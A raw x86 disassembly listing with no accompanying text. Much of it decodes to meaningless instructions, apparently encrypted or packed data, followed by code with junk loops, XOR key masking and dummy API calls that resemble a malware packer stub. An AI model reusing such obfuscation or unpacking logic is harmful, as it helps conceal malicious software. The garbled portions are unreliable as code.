  403035:	lea    eax,[edx]
  403037:	jno    0x403001
  403039:	clc    
  40303a:	pop    es
  40303b:	hlt    
  40303c:	mov    ch,0xa4
  40303e:	dec    esp
  40303f:	jbe    0x403032
  403041:	jnp    0x4030bb
  403043:	imul   eax,DWORD PTR [eax+0x39],0x8bf1bf54
  40304a:	cmp    BYTE PTR [ecx-0x92dcfaf],bl
  403050:	adc    BYTE PTR [eax+0x1e],ch
  403053:	add    edx,esp
  403055:	mov    BYTE PTR [ecx+0x2e],cl
  403058:	xor    BYTE PTR [eax+0x4f0a5433],bh
  40305e:	js     0x403064
  403060:	cmp    BYTE PTR ds:0xf28c6fb9,dl
  403066:	jne    0x403032
  403068:	lahf   
  403069:	aaa    
  40306a:	adc    BYTE PTR [edi],bh
  40306c:	fidivr WORD PTR [eax-0x1c]
  40306f:	out    0xde,al
  403071:	(bad)  
  403072:	retf   
  403073:	dec    esp
  403074:	push   es
  403075:	test   cl,0x2
  403078:	jmp    0xe966:0x1b225a48
  40307f:	out    dx,al
  403080:	inc    ebp
  403081:	push   ds
  403082:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403083:	jecxz  0x4030a1
  403085:	xchg   ebp,eax
  403086:	mov    al,0x3
  403088:	shl    edi,1
  40308a:	int3   
  40308b:	mov    ecx,0xb7c01696
  403090:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403091:	js     0x403063
  403093:	mov    cs,WORD PTR ds:0xf61b7c5a
  403099:	scas   eax,DWORD PTR es:[edi]
  40309a:	add    DWORD PTR ds:0x9c897e4f,eax
  4030a0:	xor    dh,BYTE PTR [ecx+0x20]
  4030a3:	inc    ebx
  4030a4:	push   0x3e643b37
  4030a9:	and    al,0xae
  4030ab:	call   0xa9e7989f
  4030b0:	js     0x40308f
  4030b2:	loopne 0x40312b
  4030b4:	jae    0x403053
  4030b6:	or     eax,0xe9321e1e
  4030bb:	sahf   
  4030bc:	arpl   WORD PTR [ebp+0x5c526eec],bp
  4030c2:	ins    BYTE PTR es:[edi],dx
  4030c3:	mov    ch,0x1a
  4030c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4030c6:	inc    edx
  4030c7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4030c8:	push   es
  4030c9:	or     ch,bh
  4030cb:	push   esp
  4030cc:	mov    edi,0xb5a3d04e
  4030d1:	mov    DWORD PTR [edx*1+0x36248df1],esp
  4030d8:	pop    esp
  4030d9:	int3   
  4030da:	ins    DWORD PTR es:[edi],dx
  4030db:	mov    ebx,0xe57ad137
  4030e0:	push   ds
  4030e1:	cmp    dl,BYTE PTR [eax-0x2a800e21]
  4030e7:	xlat   BYTE PTR ds:[ebx]
  4030e8:	xor    ecx,ebx
  4030ea:	cmp    BYTE PTR [edi+0x15],ah
  4030ed:	sbb    al,0x46
  4030ef:	sbb    DWORD PTR [ebx-0x60],esi
  4030f2:	xchg   esi,eax
  4030f3:	mov    edi,DWORD PTR [ebp+0x13]
  4030f6:	pop    edi
  4030f7:	cmp    ecx,DWORD PTR [esi+0x68]
  4030fa:	ja     0x403153
  4030fc:	ins    DWORD PTR es:[edi],dx
  4030fd:	js     0x4030ce
  4030ff:	sbb    al,0x8a
  403101:	int    0x8f
  403103:	pusha  
  403104:	mov    dl,0x84
  403106:	jb     0x403175
  403108:	dec    ebx
  403109:	or     BYTE PTR [ebx+ecx*2-0x76d34b26],bh
  403110:	mov    eax,ds:0xa97a452c
  403115:	fsub   DWORD PTR ss:[ebx+ebx*2]
  403119:	jle    0x4030c3
  40311b:	inc    eax
  40311c:	stc    
  40311d:	aaa    
  40311e:	dec    bh
  403120:	outs   dx,BYTE PTR ds:[esi]
  403121:	sub    DWORD PTR [ebx],eax
  403123:	dec    eax
  403124:	(bad)  
  403125:	scas   eax,DWORD PTR es:[edi]
  403126:	lea    ecx,[ebx]
  403128:	cmp    DWORD PTR fs:[ebx],ebp
  40312b:	xchg   ebp,eax
  40312c:	(bad)  
  40312d:	lahf   
  40312e:	push   edx
  40312f:	xchg   ebp,eax
  403130:	pop    ecx
  403131:	push   es
  403132:	sbb    DWORD PTR [esi+0x3e5bdcdf],ecx
  403138:	cmp    eax,0x79949bad
  40313d:	jg     0x4030f3
  40313f:	push   0x76a3c912
  403144:	push   edi
  403145:	repz xchg ecx,eax
  403147:	xor    eax,0xfc70e07d
  40314c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40314d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40314e:	leave  
  40314f:	out    0xa0,eax
  403151:	adc    al,0x8a
  403153:	aaa    
  403154:	cmp    eax,0x7eac7352
  403159:	out    dx,al
  40315a:	jle    0x40311e
  40315c:	arpl   WORD PTR [esi-0x71e1e49],di
  403162:	mov    cl,0x20
  403164:	fisubr DWORD PTR [ecx]
  403166:	pop    eax
  403167:	cld    
  403168:	inc    ebx
  403169:	scas   al,BYTE PTR es:[edi]
  40316a:	pop    ss
  40316b:	lods   al,BYTE PTR ds:[esi]
  40316d:	sub    BYTE PTR [eax+eiz*2+0x60],ch
  403171:	dec    edi
  403172:	fisttp WORD PTR [edi-0x40a4eaaa]
  403178:	arpl   WORD PTR [ecx+0x3e],cx
  40317b:	push   es
  40317c:	sbb    al,0x61
  40317e:	(bad)  
  40317f:	and    eax,0x39d49446
  403184:	movsx  esi,BYTE PTR [ebx+0x517c1d9d]
  40318b:	pop    DWORD PTR [ebx]
  40318d:	xor    edi,DWORD PTR [edx-0x5a]
  403190:	xchg   DWORD PTR [esi+0x7acb57a1],esi
  403196:	(bad)  
  403197:	fsubp  st(0),st
  403199:	(bad)
  40319d:	adc    al,0x75
  40319f:	rcr    DWORD PTR [esi+0xe],0x61
  4031a3:	xchg   DWORD PTR [ebx+0x49f40810],edx
  4031a9:	lock mov bh,0x95
  4031ac:	ins    BYTE PTR es:[edi],dx
  4031ad:	mov    DWORD PTR [edi-0x64b8a54f],esp
  4031b3:	inc    ecx
  4031b4:	add    eax,0x57540ee2
  4031b9:	xor    ebp,DWORD PTR cs:0x7ab9b30b
  4031c0:	xchg   ecx,eax
  4031c1:	pop    eax
  4031c2:	add    BYTE PTR [ebx+0x1f],0x1a
  4031c6:	cwde   
  4031c7:	mov    ah,0x90
  4031c9:	inc    ebp
  4031ca:	lahf   
  4031cb:	sub    BYTE PTR [ecx+0x3c2d93d0],dl
  4031d1:	ror    DWORD PTR [ebp-0x4b],0x68
  4031d5:	add    BYTE PTR [edx-0x56],dl
  4031d8:	retf   
  4031d9:	enter  0x10d2,0xea
  4031dd:	jecxz  0x403208
  4031df:	jecxz  0x403237
  4031e1:	scas   eax,DWORD PTR es:[edi]
  4031e2:	push   esp
  4031e3:	sbb    eax,0x97b1a4fd
  4031e8:	mov    al,ds:0xa81043f2
  4031ed:	(bad)  
  4031ee:	inc    BYTE PTR [ebx]
  4031f0:	inc    ebp
  4031f1:	aas    
  4031f2:	mov    dl,0xd2
  4031f4:	(bad)  
  4031f5:	scas   al,BYTE PTR es:[edi]
  4031f6:	dec    edx
  4031f7:	es mov edi,0xa794f635
  4031fd:	popf   
  4031fe:	pop    esp
  4031ff:	(bad)  
  403200:	imul   ebx,DWORD PTR [ecx-0x1b7973d4],0x55
  403207:	jnp    0x403288
  403209:	aaa    
  40320a:	and    eax,0x72889bb9
  40320f:	jnp    0x4031e0
  403211:	std    
  403212:	ss push edx
  403214:	cmp    al,0x45
  403216:	jo     0x403214
  403218:	aam    0x5a
  40321a:	dec    edi
  40321b:	jbe    0x403254
  40321d:	sbb    edx,DWORD PTR [eax]
  40321f:	xchg   ebp,eax
  403220:	jb     0x4031b3
  403222:	int3   
  403223:	mov    ch,0x26
  403225:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403226:	mov    ah,0xb6
  403228:	leave  
  403229:	push   edx
  40322a:	retf   
  40322b:	push   ecx
  40322c:	pop    edi
  40322d:	pop    es
  40322e:	or     eax,0xf9a62e17
  403233:	mov    dh,0x97
  403235:	adc    ebp,esp
  403237:	call   0x5391b1da
  40323c:	push   edx
  40323d:	(bad)  
  40323e:	dec    DWORD PTR [ecx+0x45516e80]
  403244:	ret    
  403245:	xchg   ecx,eax
  403246:	inc    ebx
  403247:	dec    edx
  403248:	jb     0x403290
  40324a:	inc    ebx
  40324b:	adc    ecx,ebp
  40324d:	fs cmc 
  40324f:	mov    ecx,0x72dde37
  403254:	pop    esi
  403255:	sbb    al,0xfa
  403257:	jno    0x403271
  403259:	cld    
  40325a:	xchg   ebp,eax
  40325b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40325c:	ins    DWORD PTR es:[edi],dx
  40325d:	adc    BYTE PTR [esp+ebp*8+0x73],bl
  403261:	push   ds
  403262:	sbb    BYTE PTR [ebx-0x39],dl
  403265:	call   0xa41afcca
  40326a:	cmp    esi,DWORD PTR [ebx-0x27dedb0d]
  403270:	xchg   BYTE PTR [ebx+0x6b],ah
  403273:	push   cs
  403274:	mov    esp,0xc9764e5e
  403279:	aam    0x92
  40327b:	jae    0x40327c
  40327d:	out    0x83,eax
  40327f:	jmp    0xe24a8cef
  403284:	popf   
  403285:	jge    0x4032d3
  403287:	loope  0x40328d
  403289:	(bad)  
  40328a:	cdq    
  40328b:	pop    edx
  40328c:	rol    BYTE PTR [eax],1
  40328e:	pop    eax
  40328f:	xchg   edx,eax
  403290:	and    esp,DWORD PTR [esi]
  403292:	mov    edi,0xa7ace6fd
  403297:	clc    
  403298:	loopne 0x40323c
  40329a:	push   esp
  40329b:	mov    ah,0x4e
  40329d:	push   DWORD PTR [edi]
  40329f:	add    ah,BYTE PTR [ecx]
  4032a1:	test   BYTE PTR [ebx+0x6e],dh
  4032a4:	push   ss
  4032a5:	jbe    0x40322a
  4032a7:	xchg   edi,eax
  4032a8:	in     eax,0xf7
  4032aa:	js     0x4032d4
  4032ac:	xchg   edx,eax
  4032ad:	nop
  4032ae:	sub    bl,BYTE PTR [edx+0x48e3825e]
  4032b4:	cmp    ebp,edi
  4032b6:	aaa    
  4032b7:	or     bl,dh
  4032b9:	mov    ah,ch
  4032bb:	cdq    
  4032bc:	iret   
  4032bd:	sbb    al,0x9a
  4032bf:	aad    0xc2
  4032c1:	int    0x75
  4032c3:	and    bl,dl
  4032c5:	cmp    ebp,edi
  4032c7:	(bad)  
  4032c8:	pop    esi
  4032c9:	fbld   TBYTE PTR [edi]
  4032cb:	sahf   
  4032cc:	les    edi,FWORD PTR [edx+ebp*2-0x59d496c1]
  4032d3:	jns    0x4032eb
  4032d5:	aas    
  4032d6:	jmp    0x6c70:0xcfeba794
  4032dd:	mov    eax,0x8d24ad1
  4032e2:	push   ss
  4032e3:	or     bl,BYTE PTR [edx-0x45ee645f]
  4032e9:	adc    DWORD PTR [edx-0x50],esp
  4032ec:	mov    ds:0x9e706aa8,ax
  4032f2:	aam    0x42
  4032f4:	cwde   
  4032f5:	cs jae 0x4032fb
  4032f8:	jecxz  0x40334f
  4032fa:	popf   
  4032fb:	inc    edx
  4032fc:	jns    0x4032b4
  4032fe:	imul   edx,ebp,0xffffffe6
  403301:	push   cs
  403302:	jmp    0x40329a
  403304:	add    dl,BYTE PTR [esi+ecx*2-0x52f5bb99]
  40330b:	fmul   DWORD PTR [eax+0x6a]
  40330e:	inc    ebx
  40330f:	sub    BYTE PTR [edi+ebp*1+0x75c1ea],bl
  403316:	jb     0x403396
  403318:	sub    dl,dh
  40331a:	mov    dl,0x42
  40331c:	dec    eax
  40331d:	stc    
  40331e:	add    esp,DWORD PTR [edx+0x25]
  403321:	mov    es,ecx
  403323:	push   0xffffffe2
  403325:	shr    DWORD PTR [eax-0x55efc04c],0x75
  40332c:	aad    0x20
  40332e:	mov    ecx,0xe0f70b90
  403333:	push   ds
  403334:	and    edx,DWORD PTR [esi]
  403336:	fs push ss
  403338:	push   0x5e0bdd31
  40333d:	hlt    
  40333e:	xchg   ebx,eax
  40333f:	daa    
  403340:	xor    bl,0xa7
  403343:	rcl    DWORD PTR [ebx-0x78e53d5f],0x36
  40334a:	add    BYTE PTR [edi-0x210695e4],cl
  403350:	xor    BYTE PTR [ecx+ecx*1-0xa7aef58],cl
  403357:	ins    BYTE PTR es:[edi],dx
  403358:	(bad)  [eax]
  40335a:	mov    dh,0x47
  40335c:	pop    es
  40335d:	mov    ds:0x735a8a89,al
  403362:	call   0xbc7bd17a
  403367:	xor    esi,ebx
  403369:	sbb    dl,BYTE PTR [edi]
  40336b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40336c:	enter  0x291f,0x8d
  403370:	lds    ebx,FWORD PTR [eax-0x68]
  403373:	sub    eax,0x62a5431
  403378:	mov    BYTE PTR [ebp+edx*8-0x678ba89c],dl
  40337f:	jg     0x4033a4
  403381:	aas    
  403382:	es out 0xda,al
  403385:	(bad)  
  403386:	lods   eax,DWORD PTR ds:[esi]
  403387:	inc    edi
  403388:	jae    0x40331b
  40338a:	push   edi
  40338b:	je     0x40333f
  40338d:	jo     0x403378
  40338f:	mov    esi,0x93ac77e
  403394:	inc    esi
  403395:	mov    ebx,0x2b129dc5
  40339a:	loop   0x4033ac
  40339c:	test   BYTE PTR [ebp-0x19],bh
  40339f:	cmp    ah,dl
  4033a1:	inc    ebx
  4033a2:	fisub  DWORD PTR [edx]
  4033a4:	(bad)  
  4033a5:	outs   dx,BYTE PTR ds:[esi]
  4033a6:	stc    
  4033a7:	mov    ds:0xde04d5f1,al
  4033ac:	pop    es
  4033ad:	and    BYTE PTR [ecx],dh
  4033af:	xchg   ebp,eax
  4033b0:	in     eax,0x97
  4033b2:	inc    edx
  4033b3:	in     eax,dx
  4033b4:	int3   
  4033b5:	sti    
  4033b6:	dec    ebx
  4033b7:	sub    bh,BYTE PTR [eax]
  4033b9:	test   BYTE PTR fs:[ebx-0x1e],dh
  4033bd:	mul    WORD PTR [edx+0x40]
  4033c1:	ret    0x901a
  4033c4:	(bad)  
  4033c5:	mov    eax,ds:0xf3826e29
  4033ca:	xchg   ecx,eax
  4033cb:	ja     0x40343a
  4033cd:	das    
  4033ce:	rcl    ch,1
  4033d0:	xor    eax,0x3ea5539f
  4033d5:	stos   BYTE PTR es:[edi],al
  4033d6:	pop    es
  4033d7:	ins    BYTE PTR es:[edi],dx
  4033d8:	sti    
  4033d9:	(bad)  
  4033db:	fimul  WORD PTR [edx+0x6c]
  4033de:	pushf  
  4033df:	imul   edx,DWORD PTR ds:0xa6cee4ec,0x61
  4033e6:	push   es
  4033e7:	aaa    
  4033e8:	or     al,0xc3
  4033ea:	adc    ebp,DWORD PTR [ecx+ecx*1+0x64]
  4033ee:	dec    ecx
  4033ef:	sub    eax,0xf61f3a9a
  4033f4:	mov    al,ds:0x5c987b9a
  4033f9:	xchg   ebx,eax
  4033fa:	call   0x31212f6c
  4033ff:	imul   ebp,ecx,0xf52cb247
  403405:	jecxz  0x40341d
  403407:	push   ebx
  403408:	sahf   
  403409:	es jo  0x403394
  40340c:	push   eax
  40340d:	cmp    DWORD PTR ds:0xacc3cb6c,0x69303aad
  403417:	enter  0xecc,0xc1
  40341b:	xor    esi,DWORD PTR [edi]
  40341d:	mov    ebp,0x4844b383
  403422:	mov    al,0x4b
  403424:	test   eax,0x8b3b94b
  403429:	sub    edx,DWORD PTR [esi+0x2659b377]
  40342f:	inc    esp
  403430:	sbb    edi,DWORD PTR [edi]
  403432:	fist   WORD PTR [ebp+0x66ffea23]
  403438:	pop    eax
  403439:	mov    ds:0xacb58965,al
  40343e:	lea    ecx,[edi+ebp*8-0x3412d835]
  403445:	mov    ah,0xa3
  403447:	or     bh,BYTE PTR [edi+0x6a]
  40344a:	mov    WORD PTR [ecx],es
  40344c:	clc    
  40344d:	retf   
  40344e:	inc    eax
  40344f:	xchg   edx,eax
  403450:	and    DWORD PTR [ebx+ecx*2-0x17],esi
  403454:	dec    ebx
  403455:	js     0x403460
  403457:	ins    BYTE PTR es:[edi],dx
  403458:	retf   
  403459:	xor    eax,0x5cae5d9a
  40345e:	or     ch,BYTE PTR [ebp-0x4aca6bc2]
  403464:	and    ebp,0x9aff7c8b
  40346a:	loope  0x403470
  40346c:	pop    edx
  40346d:	mov    ebp,0x5ff6accc
  403472:	fimul  DWORD PTR [ecx]
  403474:	jo     0x4034d5
  403476:	gs test eax,0xafcc17f
  40347c:	jle    0x40342f
  40347e:	push   edi
  40347f:	fiadd  WORD PTR [edi+0x31]
  403482:	dec    esi
  403483:	xor    eax,0xc3729b1d
  403488:	inc    eax
  403489:	mov    DWORD PTR [esi],edi
  40348b:	jl     0x4034f2
  40348d:	adc    ebx,DWORD PTR [esi-0x48]
  403490:	test   DWORD PTR [ecx+0xe97f4fe],ebp
  403496:	ins    DWORD PTR es:[edi],dx
  403497:	add    edi,DWORD PTR [edi]
  403499:	and    bh,bl
  40349b:	loop   0x403422
  40349d:	xchg   esp,eax
  40349e:	xchg   ebp,ebx
  4034a0:	mov    esi,0x546854bb
  4034a5:	addr16 or al,0x89
  4034a8:	cld    
  4034a9:	xor    ebx,0xffffffc7
  4034ac:	cmovbe eax,esp
  4034af:	push   0xaff0eb71
  4034b4:	mov    ds:0x715b80c5,eax
  4034b9:	mov    esi,0x3eea725d
  4034be:	add    al,0xf2
  4034c0:	sub    BYTE PTR [esi+0x65],bh
  4034c3:	lock les ecx,FWORD PTR [eax]
  4034c6:	mov    dh,0xb3
  4034c8:	dec    edx
  4034c9:	xchg   ebp,eax
  4034ca:	shl    DWORD PTR [edi+0x4d24a41c],0x1c
  4034d1:	icebp  
  4034d2:	enter  0xe113,0x13
  4034d6:	neg    BYTE PTR [edx]
  4034d8:	popf   
  4034d9:	cwde   
  4034da:	test   al,0x3e
  4034dc:	fwait
  4034dd:	cmp    BYTE PTR [esi-0x245833b1],al
  4034e3:	mov    bl,0x9
  4034e5:	xor    al,0x5d
  4034e7:	xchg   ebx,eax
  4034e8:	stos   BYTE PTR es:[edi],al
  4034e9:	push   ebp
  4034ea:	jbe    0x4034d0
  4034ec:	pop    edi
  4034ed:	dec    edx
  4034ee:	xchg   BYTE PTR [edx+edx*4+0x7f],al
  4034f2:	add    BYTE PTR [ebx+0x5b76f92e],bh
  4034f8:	push   edx
  4034f9:	call   0x4bdb:0x1b5241c2
  403500:	into   
  403501:	adc    edx,esp
  403503:	ss add esp,eax
  403506:	dec    esi
  403507:	daa    
  403508:	ret    
  403509:	pop    edi
  40350a:	mov    ecx,0x128d6e46
  40350f:	sbb    BYTE PTR [edx-0x3f],0x82
  403513:	out    0x54,eax
  403515:	hlt    
  403516:	fsub   st,st(4)
  403518:	fldenv [ebx]
  40351a:	push   ebp
  40351b:	push   ss
  40351c:	addr16 popf 
  40351e:	xor    DWORD PTR [edx],ebp
  403520:	adc    BYTE PTR [ecx+0x3f],dh
  403523:	pop    ss
  403524:	stos   DWORD PTR es:[edi],eax
  403525:	mov    cl,0xd6
  403527:	inc    edx
  403528:	dec    esi
  403529:	jmp    DWORD PTR [ebx+0x74e75877]
  40352f:	inc    cx
  403531:	or     al,0xd
  403533:	out    dx,al
  403534:	mov    cs,edx
  403536:	sub    DWORD PTR [edi-0x4a],ecx
  403539:	icebp  
  40353a:	adc    esi,ecx
  40353c:	mov    dl,0x78
  40353e:	add    eax,DWORD PTR [eax+0x4cbe21c3]
  403544:	(bad)  [edx+edi*2]
  403547:	sub    bh,BYTE PTR [ecx]
  403549:	push   edi
  40354a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40354b:	xchg   esi,eax
  40354c:	sbb    eax,0x61c1a22f
  403551:	aad    0x26
  403553:	cmp    al,0x7b
  403555:	jns    0x40357a
  403557:	xchg   edx,eax
  403558:	mov    bl,0xe9
  40355a:	jl     0x4035c0
  40355c:	repz out 0xcc,eax
  40355f:	xchg   ebx,eax
  403560:	adc    DWORD PTR [edx-0xcb50b18],ebp
  403566:	adc    esi,eax
  403568:	outs   dx,BYTE PTR ds:[esi]
  403569:	dec    edx
  40356a:	fidiv  DWORD PTR [edi+0x4a519e0]
  403570:	(bad)  
  403571:	mov    ss,esi
  403573:	sahf   
  403574:	pushf  
  403575:	mov    ah,0xa3
  403577:	mov    al,0x19
  403579:	outs   dx,DWORD PTR ds:[esi]
  40357a:	cmp    eax,ebx
  40357c:	mov    edx,0xbb3559f
  403581:	jmp    0x4035ef
  403583:	frstor [esi-0x211fda8]
  403589:	cmc    
  40358a:	xor    DWORD PTR [edi-0x5],esp
  40358d:	jg     0x403580
  40358f:	xor    DWORD PTR [edx+0x4f4bd419],eax
  403595:	push   0x4
  403597:	pop    ecx
  403598:	and    DWORD PTR ds:0x428e5d,0x744e
  4035a2:	sub    ecx,eax
  4035a4:	and    DWORD PTR ds:0x428e5d,0x0
  4035ae:	mov    eax,ds:0x428e5d
  4035b3:	inc    eax
  4035b4:	mov    ds:0x428e5d,eax
  4035b9:	cmp    DWORD PTR ds:0x428e5d,0x1f
  4035c0:	jge    0x4035e8
  4035c6:	jmp    0x4035db
  4035cb:	push   0x7a18
  4035d0:	push   0x1440
  4035d5:	call   DWORD PTR ds:0x42ca1c
  4035db:	cmp    DWORD PTR ds:0x428e5d,0x1b
  4035e2:	jb     0x4035ae
  4035e8:	add    ecx,DWORD PTR [ebp-0x1c]
  4035eb:	mov    DWORD PTR [ebp-0x2c],0xf89c85f9
  4035f2:	and    DWORD PTR ds:0x428e89,0x0
  4035fc:	mov    eax,ds:0x428e89
  403601:	inc    eax
  403602:	mov    ds:0x428e89,eax
  403607:	cmp    DWORD PTR ds:0x428e89,0x25
  40360e:	jb     0x403631
  403614:	jmp    0x403624
  403619:	push   0x5d03
  40361e:	call   DWORD PTR ds:0x42ca50
  403624:	cmp    DWORD PTR ds:0x428e89,0x1d
  40362b:	jb     0x4035fc
  403631:	mov    DWORD PTR [ebp-0x18],ecx
  403634:	mov    eax,ds:0x4292f5
  403639:	mov    eax,DWORD PTR [eax]
  40363b:	or     DWORD PTR ds:0x428e99,eax
  403641:	mov    DWORD PTR [ebp-0xa0],0xf89c85bd
  40364b:	and    DWORD PTR ds:0x428e29,0x0
  403655:	jmp    0x403665
  40365a:	mov    eax,ds:0x428e29
  40365f:	inc    eax
  403660:	mov    ds:0x428e29,eax
  403665:	cmp    DWORD PTR ds:0x428e29,0x13
  40366c:	jae    0x4036b6
  403672:	cmp    DWORD PTR ds:0x428e29,0x6
  403679:	jge    0x4036b6
  40367f:	jmp    0x403699
  403684:	push   0x4646
  403689:	push   0x428124
  40368e:	push   0x428ec1
  403693:	call   DWORD PTR ds:0x42ca54
  403699:	cmp    DWORD PTR ds:0x428e29,0x5
  4036a0:	jne    0x4036b1
  4036a6:	mov    eax,ds:0x428e29
  4036ab:	inc    eax
  4036ac:	mov    ds:0x428e29,eax
  4036b1:	jmp    0x40365a
  4036b6:	mov    eax,DWORD PTR [ebp-0x14]
  4036b9:	mov    DWORD PTR [ebp-0x9c],eax
  4036bf:	mov    eax,DWORD PTR [ebp-0x18]
  4036c2:	or     DWORD PTR ds:0x428e99,0x71ca
  4036cc:	mov    DWORD PTR [ebp-0x98],eax
  4036d2:	movzx  eax,WORD PTR ds:0x428e2d
  4036d9:	sub    DWORD PTR ds:0x428e8d,eax
  4036df:	mov    eax,DWORD PTR [ebp-0x2c]
  4036e2:	xor    eax,esi
  4036e4:	xor    DWORD PTR ds:0x428ec9,0x428e59
  4036ee:	add    eax,edi
  4036f0:	mov    DWORD PTR [ebp-0x94],eax
  4036f6:	lea    eax,[ebp-0x48]
  4036f9:	mov    DWORD PTR [ebp-0x90],eax
  4036ff:	adc    eax,0x53e7
  403704:	mov    eax,DWORD PTR [ebp-0xa0]
  40370a:	adc    DWORD PTR ds:0x428e2d,0x2edb
  403714:	xor    eax,esi
  403716:	sbb    DWORD PTR ds:0x428ed1,0x428e95
  403720:	add    eax,edi
  403722:	or     DWORD PTR ds:0x428e25,0x5a5f
  40372c:	mov    DWORD PTR [ebp-0xa0],eax
  403732:	not    DWORD PTR ds:0x428e49
  403738:	lea    eax,[ebp-0xa0]
  40373e:	push   eax
  40373f:	adc    DWORD PTR ds:0x428ea9,edx
  403745:	mov    eax,DWORD PTR [ebp+0xc]
  403748:	or     DWORD PTR ds:0x428e59,0x428e79
  403752:	xor    eax,esi
  403754:	or     DWORD PTR ds:0x428e81,0x24f1
  40375e:	add    eax,edi
  403760:	or     DWORD PTR ds:0x428e75,0x428e65
  40376a:	push   eax
  40376b:	or     eax,DWORD PTR ds:0x428e55
  403771:	mov    eax,ds:0x428385
  403776:	push   0x4282db
  40377b:	push   DWORD PTR [eax]
  40377d:	call   0x40854d
  403782:	and    eax,0x5bd3
  403787:	mov    ebx,DWORD PTR [ebp-0x14]
  40378a:	movzx  edx,BYTE PTR ds:0x428ed1
  403791:	sbb    edx,DWORD PTR ds:0x428e79
  403797:	mov    DWORD PTR ds:0x428ed1,edx
  40379d:	mov    eax,DWORD PTR [ebp-0x18]
  4037a0:	mov    DWORD PTR [ebp-0x58],eax
  4037a3:	mov    DWORD PTR [ebp-0x34],0xf89c8523
  4037aa:	mov    eax,0xf89c85bb
  4037af:	mov    DWORD PTR [ebp-0x1c],eax
  4037b2:	lea    ecx,[eax-0x2]
  4037b5:	or     DWORD PTR ds:0x428ea1,0x10a8
  4037bf:	mov    DWORD PTR [ebp-0x28],ecx
  4037c2:	sub    edx,0x6e70
  4037c8:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4037cf:	movzx  edx,WORD PTR ds:0x428e7d
  4037d6:	sbb    DWORD PTR ds:0x428e4d,edx
  4037dc:	mov    DWORD PTR [ebp-0x8],eax
  4037df:	sbb    eax,DWORD PTR ds:0x428e2d
  4037e5:	mov    eax,DWORD PTR [ebp-0x10]
  4037e8:	and    DWORD PTR ds:0x428eb9,0x0
  4037f2:	jmp    0x403804
  4037f7:	mov    edx,DWORD PTR ds:0x428eb9
  4037fd:	inc    edx
  4037fe:	mov    DWORD PTR ds:0x428eb9,edx
  403804:	cmp    DWORD PTR ds:0x428eb9,0x14
  40380b:	jae    0x403852
  403811:	cmp    DWORD PTR ds:0x428eb9,0xc
  403818:	jb     0x403852
  40381e:	jmp    0x403833
  403823:	push   0x428019
  403828:	push   0x7b14
  40382d:	call   DWORD PTR ds:0x42ca20
  403833:	cmp    DWORD PTR ds:0x428eb9,0xb
  40383a:	jne    0x40384d
  403840:	mov    edx,DWORD PTR ds:0x428eb9
  403846:	inc    edx
  403847:	mov    DWORD PTR ds:0x428eb9,edx
  40384d:	jmp    0x4037f7
  403852:	xor    eax,esi
  403854:	mov    edx,0xffcd8d88
  403859:	add    DWORD PTR ds:0x428eb1,0x428ec1
  403863:	sub    edx,eax
  403865:	mov    DWORD PTR ds:0x428e39,0x1fc
  40386f:	mov    DWORD PTR [ebp-0xc],edx
  403872:	mov    DWORD PTR [ebp-0x18],0xf89c85bc
  403879:	mov    DWORD PTR ds:0x428ea5,ebx
  40387f:	mov    eax,DWORD PTR [ebp-0x8]
  403882:	mov    DWORD PTR ds:0x428ec9,0x6695
  40388c:	mov    DWORD PTR [ebp-0x3c],ebx
  40388f:	cmp    eax,ecx
  403891:	mov    DWORD PTR ds:0x428e8d,0x71c
  40389b:	je     0x403bca
  4038a1:	mov    eax,DWORD PTR [ebp-0x10]
  4038a4:	mov    ecx,DWORD PTR [ebp-0x10]
  4038a7:	xor    eax,esi
  4038a9:	xor    ecx,esi
  4038ab:	lea    ecx,[eax+ecx*1+0x64e5f0]
  4038b2:	and    DWORD PTR ds:0x428e81,0x0
  4038bc:	jmp    0x4038cf
  4038c1:	xor    eax,eax
  4038c3:	add    eax,DWORD PTR ds:0x428e81
  4038c9:	inc    eax
  4038ca:	mov    ds:0x428e81,eax
  4038cf:	cmp    DWORD PTR ds:0x428e81,0x11
  4038d6:	jae    0x403909
  4038dc:	cmp    DWORD PTR ds:0x428e81,0x1e
  4038e3:	jg     0x403909
  4038e9:	jmp    0x403904
  4038ee:	push   0x6b74
  4038f3:	push   DWORD PTR [ebp-0x10]
  4038f6:	push   DWORD PTR [ebp-0x1c]
  4038f9:	push   0x7d9c
  4038fe:	call   DWORD PTR ds:0x42ca58
  403904:	jmp    0x4038c1
  403909:	mov    eax,DWORD PTR [ebp-0xc]
  40390c:	xor    edx,edx
  40390e:	or     DWORD PTR ds:0x428eb9,0x5ac4
  403918:	div    ecx
  40391a:	mov    eax,DWORD PTR [ebp-0x8]
  40391d:	sbb    DWORD PTR ds:0x428e55,0x2d6
  403927:	mov    ecx,DWORD PTR [ebp-0x10]
  40392a:	and    DWORD PTR ds:0x428e8d,0x428e9d
  403934:	xor    eax,esi
  403936:	xor    ecx,esi
  403938:	sub    eax,ecx
  40393a:	mov    DWORD PTR ds:0x428ec5,0x3e75
  403944:	cmp    edx,eax
  403946:	mov    DWORD PTR ds:0x428e2d,0x53e
  403950:	jne    0x403b0b
  403956:	mov    eax,DWORD PTR [ebp-0xc]
  403959:	xor    DWORD PTR ds:0x428e45,ebx
  40395f:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
  403966:	sub    ecx,0x200f
  40396c:	mov    eax,DWORD PTR [ebp-0x28]
  40396f:	or     ecx,DWORD PTR ds:0x428e5d
  403975:	mov    ecx,DWORD PTR [ebp-0x18]
  403978:	xor    eax,esi
  40397a:	xor    ecx,esi
  40397c:	sbb    DWORD PTR ds:0x428e8d,0x428ead
  403986:	add    eax,edi
  403988:	sbb    DWORD PTR ds:0x428e45,0x428ec9
  403992:	add    ecx,edi
  403994:	mov    BYTE PTR [ebp-0x21],dl
  403997:	mov    DWORD PTR ds:0x428ea5,0x17c
  4039a1:	cmp    eax,ecx
  4039a3:	jae    0x403a98
  4039a9:	xor    edx,0x3299
